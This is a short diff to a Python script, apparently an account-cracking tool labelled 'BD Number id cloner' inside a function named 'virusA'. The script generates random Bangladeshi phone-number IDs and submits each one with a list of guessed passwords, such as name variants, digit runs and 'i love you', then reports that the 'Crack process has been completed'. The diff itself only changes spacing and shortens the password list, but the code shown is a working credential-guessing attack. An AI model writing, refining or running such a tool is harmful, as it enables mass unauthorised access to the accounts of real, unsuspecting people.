@@ -222,10 +222,10 @@ def virusA():
 	os.system('clear')
 	print(logo)
 	print(" ┏━[•] BD SIM CODE : 017 018 019 013 015 016]")
-	kode = input(' ┗━[+] SELECT   : ')
+	kode = input(' ┗━[+] SELECT      : ')
 	doamin = ' BD Number id cloner [ONLY-OK] '
-	print(' ┏━[•] EXAMPLE : 1000,5000,10000,15000,20000] ')
-	limit = int(input(' ┗━[+] LIMIT  : '))
+	print(' ┏━[•] EXAMPLE  : 1000,5000,10000,15000,20000] ')
+	limit = int(input(' ┗━[+] LIMIT    : '))
 	for nmbr in range(limit):
 		koda = ''.join(random.choice(string.digits) for _ in range(2))
 		kodb = ''.join(random.choice(string.digits) for _ in range(2))
@@ -242,7 +242,7 @@ def virusA():
 		print(50*'━')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','102030','203040','304050','405060','506070','607080','708090','jannat','Jannat','nusrat','Nusrat','sadiya','Sadiya','sumaiya','Sumaiya','fariya','Fariya','jannatul','Jannatul','Mimmim','mimmim']
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','102030','203040','304050','405060','506070','607080','708090','jannat','Jannat','nusrat','Nusrat','sadiya','Sadiya']
 			yaari.submit(b,uid,pwx,tl)
 	print(50*'_')
 	print(' [💉] Crack process has been completed')
